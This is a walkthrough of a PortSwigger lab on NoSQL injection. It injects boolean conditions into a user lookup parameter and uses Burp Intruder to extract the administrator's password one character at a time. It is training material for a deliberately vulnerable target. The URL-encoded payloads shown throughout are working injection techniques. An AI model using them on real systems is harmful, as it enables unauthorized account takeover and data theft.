# (Exploiting NoSQL injection to extract data)[https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-data]

> look up user `administrator` and its password

- open the lab in burp browser
- login in with `wiener:peter`
- open burp HTTP history
- send the `GET /user/lookup?user=wiener` request to the repeater

## checking for vulnerability

`'`

- add the `'` to the `wiener`

```
GET /user/lookup?user=wiener' HTTP/2
...
```

- it will error out

---

`'+'`

- add the `'+'` to the `wiener` but url encode it

```
GET /user/lookup?user=wiener'%2b' HTTP/2
...
```

- this will give back the `wiener` user

---

`' && '1'=='2` test for false condition

```
GET /user/lookup?user=wiener'+%26%26+'1'%3d%3d'2 HTTP/2
...
```

---

`' && '1'=='1` test for true condition

```
GET /user/lookup?user=wiener'+%26%26+'1'%3d%3d'1 HTTP/2
...
```

## test for password length

`administrator' && this.password.length < 30 || 'a'=='b`

```
GET /user/lookup?user=administrator'+%26%26+this.password.length+<+30+||+'a'%3d%3d'b HTTP/2
...
```

## when the length determined test for password

- send the `GET /user/lookup?user=wiener` request to the intruder
- select cluster bomb
- change the `wiener` to the following

`GET /user/lookup?user=administrator' && this.password[0]=='a HTTP/2`

- this would only check the first letter of the password for `a`
- select the `0` and click `Add §`
- select the `a` and click `Add §`
- url encode it, should look like this

```
GET /user/lookup?user=administrator'+%26%26+this.password[0]%3d%3d'a HTTP/2
...
```

- this will give option for two list
- for the first `0` add all the index options that you get form the password length
- for the second `a` add all letters a-z
- start attack
- all response will return 200, the response length will make the difference
